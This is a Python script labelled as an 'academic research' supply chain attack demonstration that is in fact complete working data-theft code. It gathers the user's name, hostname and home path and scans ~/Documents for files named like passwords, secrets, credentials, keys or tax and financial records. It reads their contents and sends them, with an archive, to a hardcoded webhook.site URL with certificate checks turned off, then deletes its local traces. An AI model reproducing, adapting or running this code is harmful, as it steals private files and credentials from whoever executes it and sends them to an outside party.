#!/usr/bin/env python3
"""
ACADEMIC RESEARCH: Supply Chain Attack Demonstration
Focused implementation targeting only the Documents directory
"""

import os
import sys
import json
import platform
import tempfile
import zipfile
import requests
import urllib3
from pathlib import Path
import hashlib
import base64
from datetime import datetime
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import logging
import time

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class SecureDataTransmitter:
    """Robust data transmitter with SSL error handling"""
    
    def __init__(self, max_retries: int = 3, timeout: int = 30):
        self.max_retries = max_retries
        self.timeout = timeout
        self.session = self._create_secure_session()
    
    def _create_secure_session(self) -> requests.Session:
        """Create a requests session with proper error handling"""
        session = requests.Session()
        
        retry_strategy = Retry(
            total=self.max_retries,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["POST"],
            raise_on_status=False
        )
        
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=5,
            pool_maxsize=10
        )
        
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        session.headers.update({
            'User-Agent': 'Research-Agent/1.0',
            'Content-Type': 'application/json'
        })
        
        return session
    
    def transmit_data(self, url: str, data: dict = None, files: dict = None) -> dict:
        """Transmit data with robust error handling"""
        
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        try:
            if files:
                response = self.session.post(
                    url,
                    files=files,
                    verify=False,
                    timeout=(10, 30)
                )
            else:
                response = self.session.post(
                    url,
                    json=data,
                    verify=False,
                    timeout=(10, 25)
                )
            
            response.raise_for_status()
            return {
                'success': True,
                'status_code': response.status_code
            }
            
        except requests.exceptions.SSLError as e:
            logger.error(f"SSL Error: {e}")
            return {
                'success': False,
                'error': f"SSL Error: {e}",
                'error_type': 'ssl_error'
            }
            
        except requests.exceptions.ConnectionError as e:
            logger.error(f"Connection Error: {e}")
            return {
                'success': False,
                'error': f"Connection Error: {e}",
                'error_type': 'connection_error'
            }
            
        except requests.exceptions.Timeout as e:
            logger.error(f"Timeout Error: {e}")
            return {
                'success': False,
                'error': f"Timeout Error: {e}",
                'error_type': 'timeout_error'
            }
            
        except Exception as e:
            logger.error(f"Transmission Error: {e}")
            return {
                'success': False,
                'error': f"Transmission Error: {e}",
                'error_type': 'general_error'
            }
    
    def close(self):
        """Clean up resources"""
        if self.session:
            self.session.close()


class DocumentsResearch:
    """Academic research focused solely on Documents directory"""
    
    def __init__(self):
        self.webhook_url = "https://webhook.site/869bb681-97c9-421b-a6a2-294934fb56bf"
        self.collected_data = {}
        self.file_contents = {}
        self.transmitter = SecureDataTransmitter(max_retries=2, timeout=20)
    
    def collect_system_info(self):
        """Collect basic system information"""
        print("[RESEARCH] Collecting system information...")
        
        self.collected_data['system_info'] = {
            'platform': platform.platform(),
            'python_version': platform.python_version(),
            'user': os.getenv('USER'),
            'home_directory': str(Path.home()),
            'current_directory': str(Path.cwd()),
            'hostname': platform.node(),
            'timestamp': datetime.now().isoformat()
        }
        
        return self.collected_data['system_info']
    
    def scan_documents_directory(self):
        """Scan only the Documents directory"""
        print("[RESEARCH] Scanning Documents directory...")
        
        documents_dir = Path.home() / "Documents"
        
        if not documents_dir.exists() or not documents_dir.is_dir():
            print("  - Documents directory not found")
            self.collected_data['documents'] = {"exists": False}
            return {"exists": False}
        
        dir_info = {
            'exists': True,
            'file_count': 0,
            'total_size': 0,
            'files': [],
            'file_types': {},
            'notable_files': []
        }
        
        try:
            all_files = []
            for item in documents_dir.rglob('*'):
                if item.is_file():
                    try:
                        stat = item.stat()
                        file_info = {
                            'path': str(item),
                            'name': item.name,
                            'size': stat.st_size,
                            'modified': stat.st_mtime,
                            'extension': item.suffix.lower(),
                            'is_notable': self.is_notable_file(item)
                        }
                        all_files.append(file_info)
                    except (OSError, PermissionError):
                        continue
                
                if len(all_files) >= 100:  # Limit for performance
                    break
            
            dir_info['files'] = all_files[:50]  # Keep top 50 files
            dir_info['file_count'] = len(all_files)
            dir_info['total_size'] = sum(f['size'] for f in all_files[:50])
            
            # Analyze file types
            for file_info in all_files[:50]:
                ext = file_info['extension']
                dir_info['file_types'][ext] = dir_info['file_types'].get(ext, 0) + 1
            
            # Identify notable files
            dir_info['notable_files'] = [f for f in all_files if f['is_notable']][:10]
            
            print(f"  - Found {len(all_files)} files, {dir_info['total_size']:,} bytes")
            
        except Exception as e:
            dir_info['error'] = str(e)
            print(f"  - Error scanning Documents: {e}")
        
        self.collected_data['documents'] = dir_info
        return dir_info
    
    def is_notable_file(self, file_path):
        """Check if a file is potentially interesting"""
        notable_extensions = {
            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.txt', '.rtf', '.odt', '.ods', '.odp',
            '.json', '.xml', '.yaml', '.yml', '.csv',
            '.zip', '.tar', '.gz', '.7z', '.rar'
        }
        
        notable_patterns = [
            'password', 'secret', 'config', 'credential', 'key',
            'backup', 'financial', 'tax', 'invoice', 'contract'
        ]
        
        name_lower = file_path.name.lower()
        
        # Check extension
        if file_path.suffix.lower() in notable_extensions:
            return True
        
        # Check filename patterns
        if any(pattern in name_lower for pattern in notable_patterns):
            return True
        
        return False
    
    def collect_file_contents(self):
        """Collect contents of notable files from Documents directory"""
        print("[RESEARCH] Collecting file contents...")
        
        documents_dir = Path.home() / "Documents"
        
        if not documents_dir.exists():
            print("  - Documents directory not found")
            return {}
        
        # Get notable files from scan
        notable_files = []
        if self.collected_data.get('documents', {}).get('notable_files'):
            notable_files = self.collected_data['documents']['notable_files']
        
        # If no notable files from scan, sample some files
        if not notable_files:
            try:
                for item in documents_dir.rglob('*'):
                    if item.is_file() and self.is_notable_file(item):
                        notable_files.append({
                            'path': str(item),
                            'name': item.name,
                            'size': item.stat().st_size
                        })
                        if len(notable_files) >= 10:
                            break
            except Exception as e:
                print(f"  - Error sampling files: {e}")
        
        collected_contents = {}
        
        for file_info in notable_files[:10]:  # Limit to 10 files
            file_path = Path(file_info['path'])
            max_size = 5000  # 5KB limit per file
            
            if file_path.exists():
                try:
                    # Try text reading first
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read(max_size)
                            collected_contents[str(file_path)] = {
                                'content': content,
                                'truncated': len(content) == max_size,
                                'size': len(content),
                                'file_size': file_path.stat().st_size,
                                'encoding': 'text'
                            }
                    except (UnicodeDecodeError, ValueError):
                        # Skip binary files for simplicity
                        collected_contents[str(file_path)] = {
                            'error': 'Binary file skipped',
                            'size': file_path.stat().st_size
                        }
                    
                    print(f"  - Collected: {file_path.name} ({collected_contents[str(file_path)]['size']} bytes)")
                    
                except Exception as e:
                    collected_contents[str(file_path)] = {
                        'error': str(e)
                    }
                    print(f"  - Error reading {file_path}: {e}")
        
        self.file_contents = collected_contents
        return collected_contents
    
    def create_archive(self):
        """Create archive of collected data"""
        print("[RESEARCH] Creating data archive...")
        
        # Include file contents in collected data
        self.collected_data['file_contents'] = {
            'summary': {
                'total_files': len(self.file_contents),
                'files_with_content': len([f for f in self.file_contents.values() if 'error' not in f]),
                'total_content_size': sum(f.get('size', 0) for f in self.file_contents.values())
            },
            'files': self.file_contents
        }
        
        # Create JSON file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(self.collected_data, f, indent=2)
            temp_json_path = f.name
        
        # Create ZIP archive
        archive_path = 'documents_research.zip'
        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(temp_json_path, 'research_data.json')
        
        # Cleanup
        os.unlink(temp_json_path)
        
        archive_size = os.path.getsize(archive_path)
        print(f"  - Archive created: {archive_size:,} bytes")
        
        return archive_path
    
    def transmit_data(self, archive_path):
        """Transmit collected data"""
        print("[RESEARCH] Transmitting data...")
        
        try:
            # Prepare metadata payload
            metadata_payload = {
                'research_purpose': 'Documents Directory Analysis',
                'timestamp': datetime.now().isoformat(),
                'collection_summary': {
                    'documents_files': self.collected_data['documents'].get('file_count', 0),
                    'file_contents_collected': len(self.file_contents),
                    'archive_size': os.path.getsize(archive_path)
                },
                'system_info': self.collected_data['system_info'],
                'documents_summary': {
                    'file_count': self.collected_data['documents'].get('file_count', 0),
                    'total_size': self.collected_data['documents'].get('total_size', 0),
                    'notable_files': len(self.collected_data['documents'].get('notable_files', []))
                }
            }
            
            print("  - Sending metadata...")
            metadata_result = self.transmitter.transmit_data(
                self.webhook_url,
                data=metadata_payload
            )
            
            # Send file contents
            files_sent = 0
            for file_path, content_info in self.file_contents.items():
                if 'error' not in content_info:
                    file_payload = {
                        'file_path': file_path,
                        'file_content': content_info.get('content', ''),
                        'size': content_info.get('size', 0),
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    file_result = self.transmitter.transmit_data(
                        self.webhook_url,
                        data=file_payload
                    )
                    
                    if file_result.get('success'):
                        files_sent += 1
                    
                    time.sleep(1)  # Rate limiting
            
            # Send archive
            print("  - Sending archive...")
            with open(archive_path, 'rb') as f:
                archive_result = self.transmitter.transmit_data(
                    self.webhook_url,
                    files={'file': ('research.zip', f, 'application/zip')}
                )
            
            result = {
                'metadata_sent': metadata_result.get('success', False),
                'files_sent': files_sent,
                'total_files': len([f for f in self.file_contents.values() if 'error' not in f]),
                'archive_sent': archive_result.get('success', False)
            }
            
            print(f"  - Transmission complete:")
            print(f"    Metadata: {'SUCCESS' if result['metadata_sent'] else 'FAILED'}")
            print(f"    Files: {result['files_sent']}/{result['total_files']}")
            print(f"    Archive: {'SUCCESS' if result['archive_sent'] else 'FAILED'}")
            
            return result
            
        except Exception as e:
            print(f"  - Transmission error: {e}")
            return {'error': str(e)}
    
    def cleanup(self, archive_path):
        """Clean up resources"""
        try:
            self.transmitter.close()
            if os.path.exists(archive_path):
                os.unlink(archive_path)
                print("[RESEARCH] Cleanup completed")
        except Exception as e:
            print(f"[RESEARCH] Cleanup warning: {e}")


def main():
    """Main execution function"""
    print("🔬 DOCUMENTS DIRECTORY RESEARCH")
    print("=" * 50)
    print("Research Focus: Documents directory analysis")
    print("Target: ~/Documents")
    print("=" * 50)
    
    researcher = DocumentsResearch()
    archive_path = None
    
    try:
        # Data collection
        print("\n[PHASE 1] DATA COLLECTION")
        system_info = researcher.collect_system_info()
        documents_data = researcher.scan_documents_directory()
        file_contents = researcher.collect_file_contents()
        
        # Data preparation
        print("\n[PHASE 2] DATA PREPARATION")
        archive_path = researcher.create_archive()
        
        # Data transmission
        print("\n[PHASE 3] DATA TRANSMISSION")
        transmission_result = researcher.transmit_data(archive_path)
        
        # Summary
        print("\n" + "=" * 50)
        print("📊 RESEARCH SUMMARY:")
        print("=" * 50)
        print(f"System: {system_info['platform']}")
        print(f"User: {system_info['user']}")
        
        if documents_data.get('exists'):
            print(f"Documents: {documents_data['file_count']} files, {documents_data['total_size']:,} bytes")
            print(f"Notable files: {len(documents_data.get('notable_files', []))}")
            print(f"Contents collected: {len(file_contents)} files")
        
        if transmission_result and 'error' not in transmission_result:
            print(f"Data transmitted: {transmission_result['files_sent']} files")
        
        print("\n✅ RESEARCH COMPLETED")
        
    except KeyboardInterrupt:
        print("\n⚠️  Research interrupted")
    except Exception as e:
        print(f"\n❌ Research error: {e}")
    finally:
        if archive_path:
            researcher.cleanup(archive_path)


if __name__ == "__main__":
    main()
